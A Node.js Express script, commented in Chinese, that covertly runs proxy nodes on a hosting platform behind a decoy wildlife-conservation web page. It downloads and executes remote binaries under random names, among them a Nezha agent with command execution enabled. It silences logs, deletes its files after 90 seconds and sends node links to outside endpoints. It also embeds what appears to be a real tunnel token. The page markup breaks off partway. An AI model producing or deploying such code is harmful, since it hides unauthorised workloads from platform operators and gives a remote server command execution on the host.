const express = require("express");
const app = express();
const axios = require("axios");
const os = require('os');
const fs = require("fs");
const path = require("path");
const { promisify } = require('util');
const exec = promisify(require('child_process').exec);
const UPLOAD_URL = process.env.UPLOAD_URL || '';      // 节点或订阅自动上传地址,需填写部署Merge-sub项目后的首页地址,例如：https://merge.xxx.com
const PROJECT_URL = process.env.PROJECT_URL || '';    // 需要上传订阅或保活时需填写项目分配的url,例如：https://google.com
const AUTO_ACCESS = process.env.AUTO_ACCESS || false; // false关闭自动保活，true开启,需同时填写PROJECT_URL变量
const FILE_PATH = process.env.FILE_PATH || '.tmp';   // 运行目录,sub节点文件保存目录
const SUB_PATH = process.env.SUB_PATH || 'cfg';       // 订阅路径
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;        // http服务订阅端口
const UUID = process.env.UUID || 'ccad32d8-c514-4662-8f5c-eef9e88641ed'; // 使用哪吒v1,在不同的平台运行需修改UUID,否则会覆盖
const NEZHA_SERVER = process.env.NEZHA_SERVER || '';        // 哪吒v1填写形式: nz.abc.com:8008  哪吒v0填写形式：nz.abc.com
const NEZHA_PORT = process.env.NEZHA_PORT || '';            // 使用哪吒v1请留空，哪吒v0需填写
const NEZHA_KEY = process.env.NEZHA_KEY || '';              // 哪吒v1的NZ_CLIENT_SECRET或哪吒v0的agent密钥
const ARGO_DOMAIN = process.env.ARGO_DOMAIN || 'freeym.liummei.dpdns.org';          // 固定隧道域名,留空即启用临时隧道
const ARGO_AUTH = process.env.ARGO_AUTH || 'eyJhIjoiNTJhODQzYzdiZWNiZDFjMGEwNzU2YjFjZjQ5ODM5NDgiLCJ0IjoiOWE3NjUzZGEtMDdlOC00YTc5LWE0OWYtNTM3N2E0MmUxNjI5IiwicyI6IlptUmxNekl3TnpFdE9ERmhOUzAwTm1SbUxXSTFaREV0TkRaak9ESmpNemxtWlRsaiJ9';              // 固定隧道密钥json或token,留空即启用临时隧道,json获取地址：https://json.zone.id
const ARGO_PORT = process.env.ARGO_PORT || 8001;            // 固定隧道端口,使用token需在cloudflare后台设置和这里一致
const CFIP = process.env.CFIP || 'saas.sin.fan';            // 节点优选域名或优选ip  
const CFPORT = process.env.CFPORT || 443;                   // 节点优选域名或优选ip对应的端口
const NAME = process.env.NAME || 'freeym';                        // 节点名称

// 创建运行文件夹
if (!fs.existsSync(FILE_PATH)) {
  fs.mkdirSync(FILE_PATH);
  console.log(`${FILE_PATH} is created`);
} else {
  console.log(`${FILE_PATH} already exists`);
}

// 生成随机6位字符文件名
function generateRandomName() {
  const characters = 'abcdefghijklmnopqrstuvwxyz';
  let result = '';
  for (let i = 0; i < 6; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}

// 全局常量
const npmName = generateRandomName();
const webName = generateRandomName();
const botName = generateRandomName();
const phpName = generateRandomName();
let npmPath = path.join(FILE_PATH, npmName);
let phpPath = path.join(FILE_PATH, phpName);
let webPath = path.join(FILE_PATH, webName);
let botPath = path.join(FILE_PATH, botName);
let subPath = path.join(FILE_PATH, 'sub.txt');
let listPath = path.join(FILE_PATH, 'list.txt');
let bootLogPath = path.join(FILE_PATH, 'boot.log');
let configPath = path.join(FILE_PATH, 'config.json');

// 如果订阅器上存在历史运行节点则先删除
function deleteNodes() {
  try {
    if (!UPLOAD_URL) return;
    if (!fs.existsSync(subPath)) return;

    let fileContent;
    try {
      fileContent = fs.readFileSync(subPath, 'utf-8');
    } catch {
      return null;
    }

    const decoded = Buffer.from(fileContent, 'base64').toString('utf-8');
    const nodes = decoded.split('\n').filter(line => 
      /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line)
    );

    if (nodes.length === 0) return;

    axios.post(`${UPLOAD_URL}/api/delete-nodes`, 
      JSON.stringify({ nodes }),
      { headers: { 'Content-Type': 'application/json' } }
    ).catch((error) => { 
      return null; 
    });
    return null;
  } catch (err) {
    return null;
  }
}

// 清理历史文件
function cleanupOldFiles() {
  try {
    const files = fs.readdirSync(FILE_PATH);
    files.forEach(file => {
      const filePath = path.join(FILE_PATH, file);
      try {
        const stat = fs.statSync(filePath);
        if (stat.isFile()) {
          fs.unlinkSync(filePath);
        }
      } catch (err) {
        // 忽略所有错误，不记录日志
      }
    });
  } catch (err) {
    // 忽略所有错误，不记录日志
  }
}

// 生成xr-ay配置文件
async function generateConfig() {
  const config = {
    log: { access: '/dev/null', error: '/dev/null', loglevel: 'none' },
    inbounds: [
      { port: ARGO_PORT, protocol: 'vless', settings: { clients: [{ id: UUID, flow: 'xtls-rprx-vision' }], decryption: 'none', fallbacks: [{ dest: 3001 }, { path: "/vless-argo", dest: 3002 }, { path: "/vmess-argo", dest: 3003 }, { path: "/trojan-argo", dest: 3004 }] }, streamSettings: { network: 'tcp' } },
      { port: 3001, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID }], decryption: "none" }, streamSettings: { network: "tcp", security: "none" } },
      { port: 3002, listen: "127.0.0.1", protocol: "vless", settings: { clients: [{ id: UUID, level: 0 }], decryption: "none" }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/vless-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3003, listen: "127.0.0.1", protocol: "vmess", settings: { clients: [{ id: UUID, alterId: 0 }] }, streamSettings: { network: "ws", wsSettings: { path: "/vmess-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
      { port: 3004, listen: "127.0.0.1", protocol: "trojan", settings: { clients: [{ password: UUID }] }, streamSettings: { network: "ws", security: "none", wsSettings: { path: "/trojan-argo" } }, sniffing: { enabled: true, destOverride: ["http", "tls", "quic"], metadataOnly: false } },
    ],
    dns: { servers: ["https+local://8.8.8.8/dns-query"] },
    outbounds: [ { protocol: "freedom", tag: "direct" }, {protocol: "blackhole", tag: "block"} ]
  };
  fs.writeFileSync(path.join(FILE_PATH, 'config.json'), JSON.stringify(config, null, 2));
}

// 判断系统架构
function getSystemArchitecture() {
  const arch = os.arch();
  if (arch === 'arm' || arch === 'arm64' || arch === 'aarch64') {
    return 'arm';
  } else {
    return 'amd';
  }
}

// 下载对应系统架构的依赖文件
function downloadFile(fileName, fileUrl, callback) {
  const filePath = fileName; 
  
  // 确保目录存在
  if (!fs.existsSync(FILE_PATH)) {
    fs.mkdirSync(FILE_PATH, { recursive: true });
  }
  
  const writer = fs.createWriteStream(filePath);

  axios({
    method: 'get',
    url: fileUrl,
    responseType: 'stream',
  })
    .then(response => {
      response.data.pipe(writer);

      writer.on('finish', () => {
        writer.close();
        console.log(`Download ${path.basename(filePath)} successfully`);
        callback(null, filePath);
      });

      writer.on('error', err => {
        fs.unlink(filePath, () => { });
        const errorMessage = `Download ${path.basename(filePath)} failed: ${err.message}`;
        console.error(errorMessage); // 下载失败时输出错误消息
        callback(errorMessage);
      });
    })
    .catch(err => {
      const errorMessage = `Download ${path.basename(filePath)} failed: ${err.message}`;
      console.error(errorMessage); // 下载失败时输出错误消息
      callback(errorMessage);
    });
}

// 下载并运行依赖文件
async function downloadFilesAndRun() {  
  
  const architecture = getSystemArchitecture();
  const filesToDownload = getFilesForArchitecture(architecture);

  if (filesToDownload.length === 0) {
    console.log(`Can't find a file for the current architecture`);
    return;
  }

  const downloadPromises = filesToDownload.map(fileInfo => {
    return new Promise((resolve, reject) => {
      downloadFile(fileInfo.fileName, fileInfo.fileUrl, (err, filePath) => {
        if (err) {
          reject(err);
        } else {
          resolve(filePath);
        }
      });
    });
  });

  try {
    await Promise.all(downloadPromises);
  } catch (err) {
    console.error('Error downloading files:', err);
    return;
  }
  // 授权和运行
  function authorizeFiles(filePaths) {
    const newPermissions = 0o775;
    filePaths.forEach(absoluteFilePath => {
      if (fs.existsSync(absoluteFilePath)) {
        fs.chmod(absoluteFilePath, newPermissions, (err) => {
          if (err) {
            console.error(`Empowerment failed for ${absoluteFilePath}: ${err}`);
          } else {
            console.log(`Empowerment success for ${absoluteFilePath}: ${newPermissions.toString(8)}`);
          }
        });
      }
    });
  }
  const filesToAuthorize = NEZHA_PORT ? [npmPath, webPath, botPath] : [phpPath, webPath, botPath];
  authorizeFiles(filesToAuthorize);

  //运行ne-zha
  if (NEZHA_SERVER && NEZHA_KEY) {
    if (!NEZHA_PORT) {
      // 检测哪吒是否开启TLS
      const port = NEZHA_SERVER.includes(':') ? NEZHA_SERVER.split(':').pop() : '';
      const tlsPorts = new Set(['443', '8443', '2096', '2087', '2083', '2053']);
      const nezhatls = tlsPorts.has(port) ? 'true' : 'false';
      // 生成 config.yaml
      const configYaml = `
client_secret: ${NEZHA_KEY}
debug: false
disable_auto_update: true
disable_command_execute: false
disable_force_update: true
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
report_delay: 4
server: ${NEZHA_SERVER}
skip_connection_count: true
skip_procs_count: true
temperature: false
tls: ${nezhatls}
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: ${UUID}`;
      
      fs.writeFileSync(path.join(FILE_PATH, 'config.yaml'), configYaml);
      
      // 运行 v1
      const command = `nohup ${phpPath} -c "${FILE_PATH}/config.yaml" >/dev/null 2>&1 &`;
      try {
        await exec(command);
        console.log(`${phpName} is running`);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } catch (error) {
        console.error(`php running error: ${error}`);
      }
    } else {
      let NEZHA_TLS = '';
      const tlsPorts = ['443', '8443', '2096', '2087', '2083', '2053'];
      if (tlsPorts.includes(NEZHA_PORT)) {
        NEZHA_TLS = '--tls';
      }
      const command = `nohup ${npmPath} -s ${NEZHA_SERVER}:${NEZHA_PORT} -p ${NEZHA_KEY} ${NEZHA_TLS} --disable-auto-update --report-delay 4 --skip-conn --skip-procs >/dev/null 2>&1 &`;
      try {
        await exec(command);
        console.log(`${npmName} is running`);
        await new Promise((resolve) => setTimeout(resolve, 1000));
      } catch (error) {
        console.error(`npm running error: ${error}`);
      }
    }
  } else {
    console.log('NEZHA variable is empty,skip running');
  }
  //运行xr-ay
  const command1 = `nohup ${webPath} -c ${FILE_PATH}/config.json >/dev/null 2>&1 &`;
  try {
    await exec(command1);
    console.log(`${webName} is running`);
    await new Promise((resolve) => setTimeout(resolve, 1000));
  } catch (error) {
    console.error(`web running error: ${error}`);
  }

  // 运行cloud-fared
  if (fs.existsSync(botPath)) {
    let args;

    if (ARGO_AUTH.match(/^[A-Z0-9a-z=]{120,250}$/)) {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token ${ARGO_AUTH}`;
    } else if (ARGO_AUTH.match(/TunnelSecret/)) {
      args = `tunnel --edge-ip-version auto --config ${FILE_PATH}/tunnel.yml run`;
    } else {
      args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
    }

    try {
      await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`);
      console.log(`${botName} is running`);
      await new Promise((resolve) => setTimeout(resolve, 2000));
    } catch (error) {
      console.error(`Error executing command: ${error}`);
    }
  }
  await new Promise((resolve) => setTimeout(resolve, 5000));

}

//根据系统架构返回对应的url
function getFilesForArchitecture(architecture) {
  let baseFiles;
  if (architecture === 'arm') {
    baseFiles = [
      { fileName: webPath, fileUrl: "https://arm64.ssss.nyc.mn/web" },
      { fileName: botPath, fileUrl: "https://arm64.ssss.nyc.mn/bot" }
    ];
  } else {
    baseFiles = [
      { fileName: webPath, fileUrl: "https://amd64.ssss.nyc.mn/web" },
      { fileName: botPath, fileUrl: "https://amd64.ssss.nyc.mn/bot" }
    ];
  }

  if (NEZHA_SERVER && NEZHA_KEY) {
    if (NEZHA_PORT) {
      const npmUrl = architecture === 'arm' 
        ? "https://arm64.ssss.nyc.mn/agent"
        : "https://amd64.ssss.nyc.mn/agent";
        baseFiles.unshift({ 
          fileName: npmPath, 
          fileUrl: npmUrl 
        });
    } else {
      const phpUrl = architecture === 'arm' 
        ? "https://arm64.ssss.nyc.mn/v1" 
        : "https://amd64.ssss.nyc.mn/v1";
      baseFiles.unshift({ 
        fileName: phpPath, 
        fileUrl: phpUrl
      });
    }
  }

  return baseFiles;
}

// 获取固定隧道json
function argoType() {
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console.log("ARGO_DOMAIN or ARGO_AUTH variable is empty, use quick tunnels");
    return;
  }

  if (ARGO_AUTH.includes('TunnelSecret')) {
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.json'), ARGO_AUTH);
    const tunnelYaml = `
  tunnel: ${ARGO_AUTH.split('"')[11]}
  credentials-file: ${path.join(FILE_PATH, 'tunnel.json')}
  protocol: http2
  
  ingress:
    - hostname: ${ARGO_DOMAIN}
      service: http://localhost:${ARGO_PORT}
      originRequest:
        noTLSVerify: true
    - service: http_status:404
  `;
    fs.writeFileSync(path.join(FILE_PATH, 'tunnel.yml'), tunnelYaml);
  } else {
    console.log("ARGO_AUTH mismatch TunnelSecret,use token connect to tunnel");
  }
}

// 获取临时隧道domain
async function extractDomains() {
  let argoDomain;

  if (ARGO_AUTH && ARGO_DOMAIN) {
    argoDomain = ARGO_DOMAIN;
    console.log('ARGO_DOMAIN:', argoDomain);
    await generateLinks(argoDomain);
  } else {
    try {
      const fileContent = fs.readFileSync(path.join(FILE_PATH, 'boot.log'), 'utf-8');
      const lines = fileContent.split('\n');
      const argoDomains = [];
      lines.forEach((line) => {
        const domainMatch = line.match(/https?:\/\/([^ ]*trycloudflare\.com)\/?/);
        if (domainMatch) {
          const domain = domainMatch[1];
          argoDomains.push(domain);
        }
      });

      if (argoDomains.length > 0) {
        argoDomain = argoDomains[0];
        console.log('ArgoDomain:', argoDomain);
        await generateLinks(argoDomain);
      } else {
        console.log('ArgoDomain not found, re-running bot to obtain ArgoDomain');
        // 删除 boot.log 文件，等待 2s 重新运行 server 以获取 ArgoDomain
        fs.unlinkSync(path.join(FILE_PATH, 'boot.log'));
        async function killBotProcess() {
          try {
            if (process.platform === 'win32') {
              await exec(`taskkill /f /im ${botName}.exe > nul 2>&1`);
            } else {
              await exec(`pkill -f "[${botName.charAt(0)}]${botName.substring(1)}" > /dev/null 2>&1`);
            }
          } catch (error) {
            // 忽略输出
          }
        }
        killBotProcess();
        await new Promise((resolve) => setTimeout(resolve, 3000));
        const args = `tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile ${FILE_PATH}/boot.log --loglevel info --url http://localhost:${ARGO_PORT}`;
        try {
          await exec(`nohup ${botPath} ${args} >/dev/null 2>&1 &`);
          console.log(`${botName} is running`);
          await new Promise((resolve) => setTimeout(resolve, 3000));
          await extractDomains(); // 重新提取域名
        } catch (error) {
          console.error(`Error executing command: ${error}`);
        }
      }
    } catch (error) {
      console.error('Error reading boot.log:', error);
  }
}

// 获取isp信息
async function getMetaInfo() {
  try {
    const response1 = await axios.get('https://api.ip.sb/geoip', { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 3000 }});
    if (response1.data && response1.data.country_code && response1.data.isp) {
      return `${response1.data.country_code}-${response1.data.isp}`.replace(/\s+/g, '_');
    }
  } catch (error) {
      try {
        // 备用 ip-api.com 获取isp
        const response2 = await axios.get('http://ip-api.com/json', { headers: { 'User-Agent': 'Mozilla/5.0', timeout: 3000 }});
        if (response2.data && response2.data.status === 'success' && response2.data.countryCode && response2.data.org) {
          return `${response2.data.countryCode}-${response2.data.org}`.replace(/\s+/g, '_');
        }
      } catch (error) {
        // console.error('Backup API also failed');
      }
  }
  return 'Unknown';
}
// 生成 list 和 sub 信息
async function generateLinks(argoDomain) {
  const ISP = await getMetaInfo();
  const nodeName = NAME ? `${NAME}-${ISP}` : ISP;
  return new Promise((resolve) => {
    setTimeout(() => {
      const VMESS = { v: '2', ps: `${nodeName}`, add: CFIP, port: CFPORT, id: UUID, aid: '0', scy: 'auto', net: 'ws', type: 'none', host: argoDomain, path: '/vmess-argo?ed=2560', tls: 'tls', sni: argoDomain, alpn: '', fp: 'firefox'};
      const subTxt = `
vless://${UUID}@${CFIP}:${CFPORT}?encryption=none&security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Fvless-argo%3Fed%3D2560#${nodeName}

vmess://${Buffer.from(JSON.stringify(VMESS)).toString('base64')}

trojan://${UUID}@${CFIP}:${CFPORT}?security=tls&sni=${argoDomain}&fp=firefox&type=ws&host=${argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#${nodeName}
    `;
      // 打印 sub.txt 内容到控制台
      console.log(Buffer.from(subTxt).toString('base64'));
      fs.writeFileSync(subPath, Buffer.from(subTxt).toString('base64'));
      console.log(`${FILE_PATH}/sub.txt saved successfully`);
      uploadNodes();
      // 将内容进行 base64 编码并写入 SUB_PATH 路由
      app.get(`/${SUB_PATH}`, (req, res) => {
        const encodedContent = Buffer.from(subTxt).toString('base64');
        res.set('Content-Type', 'text/plain; charset=utf-8');
        res.send(encodedContent);
      });
      resolve(subTxt);
      }, 2000);
    });
  }
}

// 自动上传节点或订阅
async function uploadNodes() {
  if (UPLOAD_URL && PROJECT_URL) {
    const subscriptionUrl = `${PROJECT_URL}/${SUB_PATH}`;
    const jsonData = {
      subscription: [subscriptionUrl]
    };
    try {
        const response = await axios.post(`${UPLOAD_URL}/api/add-subscriptions`, jsonData, {
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        if (response && response.status === 200) {
            console.log('Subscription uploaded successfully');
            return response;
        } else {
          return null;
          //  console.log('Unknown response status');
        }
    } catch (error) {
        if (error.response) {
            if (error.response.status === 400) {
              //  console.error('Subscription already exists');
            }
        }
    }
  } else if (UPLOAD_URL) {
      if (!fs.existsSync(listPath)) return;
      const content = fs.readFileSync(listPath, 'utf-8');
      const nodes = content.split('\n').filter(line => /(vless|vmess|trojan|hysteria2|tuic):\/\//.test(line));

      if (nodes.length === 0) return;

      const jsonData = JSON.stringify({ nodes });

      try {
          const response = await axios.post(`${UPLOAD_URL}/api/add-nodes`, jsonData, {
              headers: { 'Content-Type': 'application/json' }
          });
          if (response && response.status === 200) {
            console.log('Nodes uploaded successfully');
            return response;
        } else {
            return null;
        }
      } catch (error) {
          return null;
      }
  } else {
      // console.log('Skipping upload nodes');
      return;
  }
}

// 90s后删除相关文件
function cleanFiles() {
  setTimeout(() => {
    const filesToDelete = [bootLogPath, configPath, webPath, botPath];  
    
    if (NEZHA_PORT) {
      filesToDelete.push(npmPath);
    } else if (NEZHA_SERVER && NEZHA_KEY) {
      filesToDelete.push(phpPath);
    }

    // Windows系统使用不同的删除命令
    if (process.platform === 'win32') {
      exec(`del /f /q ${filesToDelete.join(' ')} > nul 2>&1`, (error) => {
        console.clear();
        console.log('App is running');
        console.log('Thank you for using this script, enjoy!');
      });
    } else {
      exec(`rm -rf ${filesToDelete.join(' ')} >/dev/null 2>&1`, (error) => {
        console.clear();
        console.log('App is running');
        console.log('Thank you for using this script, enjoy!');
      });
    }
  }, 90000); // 90s
}
cleanFiles();

// 自动访问项目URL
async function AddVisitTask() {
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console.log("Skipping adding automatic access task");
    return;
  }

  try {
    const response = await axios.post('https://oooo.serv00.net/add-url', {
      url: PROJECT_URL
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });
    // console.log(`${JSON.stringify(response.data)}`);
    console.log(`automatic access task added successfully`);
    return response;
  } catch (error) {
    console.error(`Add automatic access task faild: ${error.message}`);
    return null;
  }
}

// 主运行逻辑
async function startserver() {
  try {
    argoType();
    deleteNodes();
    cleanupOldFiles();
    await generateConfig();
    await downloadFilesAndRun();
    await extractDomains();
    await AddVisitTask();
  } catch (error) {
    console.error('Error in startserver:', error);
  }
}
startserver().catch(error => {
  console.error('Unhandled error in startserver:', error);
});

// 根路由
app.get("/", async function(req, res) {
  const html = `<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>守护生灵 - 野生动物保护</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: -apple-system, 'Segoe UI', 'PingFang SC', 'Microsoft YaHei', sans-serif;
      background: #0a1628;
      color: #e0e8f0;
      min-height: 100vh;
      overflow-x: hidden;
    }

    /* 星空粒子背景 */
    .stars {
      position: fixed; top: 0; left: 0; width: 100%; height: 100%;
      pointer-events: none; z-index: 0;
      background: radial-gradient(ellipse at 20% 50%, #0d2137 0%, #0a1628 100%);
    }
    .stars::before, .stars::after {
      content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
      background-image:
        radial-gradient(2px 2px at 20px 30px, #ffffff33, transparent),
        radial-gradient(2px 2px at 40px 70px, #ffffff22, transparent),
        radial-gradient(1px 1px at 90px 40px, #ffffff44, transparent),
        radial-gradient(1px 1px at 130px 80px, #ffffff33, transparent),
        radial-gradient(2px 2px at 160px 30px, #ffffff22, transparent);
      background-size: 200px 100px;
      animation: twinkle 4s ease-in-out infinite alternate;
    }
    .stars::after { background-size: 300px 150px; animation-duration: 6s; }
    @keyframes twinkle { from { opacity: 0.4; } to { opacity: 1; } }

    /* 头部 */
    header {
      position: relative; z-index: 1;
      text-align: center;
      padding: 60px 20px 40px;
      background: linear-gradient(180deg, rgba(16,42,76,0.8) 0%, transparent 100%);
    }
    header .logo { font-size: 56px; margin-bottom: 8px; animation: float 3s ease-in-out infinite; }
    @keyframes float {
      0%, 100% { transform: translateY(0); }
      50% { transform: translateY(-10px); }
    }
    header h1 {
      font-size: 42px; font-weight: 800;
      background: linear-gradient(135deg, #4ade80, #22d3ee, #818cf8);
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
      background-clip: text;
      letter-spacing: 2px;
    }
    header p {
      margin-top: 12px; font-size: 18px; color: #94a3b8;
      max-width: 600px; margin-left: auto; margin-right: auto;
      line-height: 1.6;
    }

    /* 统计数据 */
    .stats {
      position: relative; z-index: 1;
      display: flex; justify-content: center; gap: 40px;
      padding: 30px 20px; flex-wrap: wrap;
    }
    .stat-card {
      text-align: center; padding: 24px 32px;
      background: rgba(255,255,255,0.04);
      border: 1px solid rgba(255,255,255,0.08);
      border-radius: 16px;
      backdrop-filter: blur(12px);
      transition: transform 0.3s, box-shadow 0.3s;
      min-width: 160px;
    }
    .stat-card:hover {
      transform: translateY(-6px);
      box-shadow: 0 12px 40px rgba(74,222,128,0.15);
      border-color: rgba(74,222,128,0.3);
    }
    .stat-card .num {
      font-size: 36px; font-weight: 800;
      background: linear-gradient(135deg, #f97316, #ef4444);
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    .stat-card .label { margin-top: 8px; font-size: 14px; color: #94a3b8; }

    /* 动物卡片区 */
    .section-title {
      position: relative; z-index: 1;
      text-align: center; font-size: 28px; font-weight: 700;
      margin: 50px 0 30px;
      color: #e2e8f0;
    }
    .section-title span {
      background: linear-gradient(135deg, #4ade80, #22d3ee);
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
      background-clip: text;
    }

    .animals {
      position: relative; z-index: 1;
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 24px; padding: 0 40px; max-width: 1200px; margin: 0 auto;
    }
    .animal-card {
      background: linear-gradient(145deg, rgba(255,255,255,0.06), rgba(255,255,255,0.02));
      border: 1px solid rgba(255,255,255,0.08);
      border-radius: 20px; overflow: hidden;
      transition: transform 0.4s, box-shadow 0.4s;
    }
    .animal-card:hover {
      transform: translateY(-8px) scale(1.02);
      box-shadow: 0 20px 60px rgba(34,211,238,0.12);
    }
    .animal-card .emoji {
      font-size: 72px; text-align: center; padding: 36px 0 16px;
      filter: drop-shadow(0 4px 12px rgba(0,0,0,0.3));
    }
    .animal-card .info { padding: 0 24px 28px; }
    .animal-card h3 { font-size: 20px; color: #f1f5f9; margin-bottom: 4px; }
    .animal-card .latin { font-size: 13px; color: #64748b; font-style: italic; margin-bottom: 12px; }
    .animal-card .desc { font-size: 14px; color: #94a3b8; line-height: 1.7; }
    .animal-card .tag {
      display: inline-block; margin-top: 14px;
      padding: 4px 14px; border-radius: 20px;
      font-size: 12px; font-weight: 600;
    }
    .tag-cr { background: rgba(239,68,68,0.15); color: #f87171; border: 1px solid rgba(239,68,68,0.3); }
    .tag-en { background: rgba(251,146,60,0.15); color: #fb923c; border: 1px solid rgba(251,146,60,0.3); }
    .tag-vu { background: rgba(250,204,21,0.15); color: #facc15; border: 1px solid rgba(250,204,21,0.3); }

    /* 行动呼吁 */
    .cta {
      position: relative; z-index: 1;
      text-align: center; padding: 70px 20px 40px;
    }
    .cta h2 {
      font-size: 32px; font-weight: 700; margin-bottom: 16px; color: #f1f5f9;
    }
    .cta p { font-size: 16px; color: #94a3b8; max-width: 560px; margin: 0 auto 30px; line-height: 1.7; }
    .cta-actions { display: flex; justify-content: center; gap: 20px; flex-wrap: wrap; }
    .cta-btn {
      display: inline-flex; align-items: center; gap: 8px;
      padding: 14px 36px; border-radius: 50px; border: none;
      font-size: 16px; font-weight: 600; cursor: pointer;
      text-decoration: none; transition: all 0.3s;
    }
    .cta-btn.primary {
      background: linear-gradient(135deg, #4ade80, #22d3ee);
      color: #0a1628;
    }
    .cta-btn.primary:hover { transform: scale(1.06); box-shadow: 0 8px 30px rgba(74,222,128,0.4); }
    .cta-btn.secondary {
      background: rgba(255,255,255,0.06);
      border: 1px solid rgba(255,255,255,0.15);
      color: #e2e8f0;
    }
    .cta-btn.secondary:hover { background: rgba(255,255,255,0.12); transform: scale(1.06); }

    /* 知识科普 */
    .tips {
      position: relative; z-index: 1;
      max-width: 900px; margin: 20px auto 40px; padding: 0 40px;
    }
    .tip-item {
      display: flex; align-items: flex-start; gap: 16px;
      padding: 20px 24px; margin-bottom: 16px;
      background: rgba(255,255,255,0.03);
      border: 1px solid rgba(255,255,255,0.06);
      border-radius: 14px;
      transition: all 0.3s;
    }
    .tip-item:hover { background: rgba(255,255,255,0.06); border-color: rgba(74,222,128,0.2); }
    .tip-item .icon { font-size: 28px; flex-shrink: 0; margin-top: 2px; }
    .tip-item .text h4 { font-size: 16px; color: #e2e8f0; margin-bottom: 6px; }
    .tip-item .text p { font-size: 14px; color: #94a3b8; line-height: 1.6; }

    /* 页脚 */
    footer {
      position: relative; z-index: 1;
      text-align: center; padding: 40px 20px;
      border-top: 1px solid rgba(255,255,255,0.06);
      color: #475569; font-size: 13px;
    }
    footer .hearts { font-size: 24px; margin-bottom: 10px; letter-spacing: 4px; }

    @media (max-width: 640px) {
      header h1 { font-size: 30px; }
      header .logo { font-size: 42px; }
      .stats { gap: 16px; }
      .stat-card { min-width: 120px; padding: 16px 20px; }
      .stat-card .num { font-size: 28px; }
      .animals { padding: 0 16px; }
      .tips { padding: 0 16px; }
    }
  </style>
</head>
<body>
  <div class="stars"></div>

  <header>
    <div class="logo">🌍</div>
    <h1>守护生灵</h1>
    <p>每一个物种的消逝，都是地球生命之书中被撕去的一页。<br>保护野生动物，就是守护我们共同的未来。</p>
  </header>

  <div class="stats">
    <div class="stat-card">
      <div class="num">41,000+</div>
      <div class="label">受威胁物种</div>
    </div>
    <div class="stat-card">
      <div class="num">1,000,000</div>
      <div class="label">面临灭绝的物种</div>
    </div>
    <div class="stat-card">
      <div class="num">68%</div>
      <div class="label">野生动物种群下降</div>
    </div>
    <div class="stat-card">
      <div class="num">150+</div>
      <div class="label">每日灭绝物种数</div>
    </div>
  </div>

  <h2 class="section-title">🦁 <span>濒危物种档案</span></h2>

  <div class="animals">
    <div class="animal-card">
      <div class="emoji">🐼</div>
      <div class="info">
        <h3>大熊猫</h3>
        <div class="latin">Ailuropoda melanoleuca</div>
        <div class="desc">中国国宝，全球生物多样性保护的旗舰物种。由于栖息地破碎化，野外种群仅存约1,800只，经数十年保护已从濒危降级为易危。</div>
        <span class="tag tag-vu">易危 VU</span>
      </div>
    </div>
    <div class="animal-card">
      <div class="emoji">🐅</div>
      <div class="info">
        <h3>华南虎</h3>
        <div class="latin">Panthera tigris amoyensis</div>
        <div class="desc">中国特有虎亚种，曾广泛分布于华南地区。因栖息地丧失与偷猎，野外已功能性灭绝，目前仅有少量圈养个体存活。</div>
        <span class="tag tag-cr">极危 CR</span>
      </div>
    </div>
    <div class="animal-card">
      <div class="emoji">🐘</div>
      <div class="info">
        <h3>亚洲象</h3>
        <div class="latin">Elephas maximus</div>
        <div class="desc">地球上最大的陆地动物之一。因象牙贸易和栖息地缩减，全球野外种群不足5万头，中国境内仅约300头。</div>
        <span class="tag tag-en">濒危 EN</span>
      </div>
    </div>
    <div class="animal-card">
      <div class="emoji">🐋</div>
      <div class="info">
        <h3>蓝鲸</h3>
        <div class="latin">Balaenoptera musculus</div>
        <div class="desc">地球上有史以来最大的动物，体长可达30米。20世纪商业捕鲸几乎将其推向灭绝，目前全球仅存约1万至2.5万头。</div>
        <span class="tag tag-en">濒危 EN</span>
      </div>
    </div>
    <div class="animal-card">
      <div class="emoji">🦏</div>
      <div class="info">
        <h3>犀牛</h3>
        <div class="latin">Rhinocerotidae</div>
        <div class="desc">地球上最古老的哺乳动物之一，已在地球上生存超过5000万年。因犀角贸易猖獗，多个亚种已经灭绝，北白犀仅剩2头。</div>
        <span class="tag tag-cr">极危 CR</span>
      </div>
    </div>
    <div class="animal-card">
      <div class="emoji">🦅</div>
      <div class="info">
        <h3>中华秋沙鸭</h3>
        <div class="latin">Mergus squamatus</div>
        <div class="desc">被誉为"水中活化石"的珍稀鸟类，对水质极为敏感，是生态环境的指示物种。全球仅存约5,000只左右。</div>
        <span class="tag tag-en">濒危 EN</span>
      </div>
    </div>
  </div>

  <div class="cta">
    <h2>每个人都能成为守护者</h2>
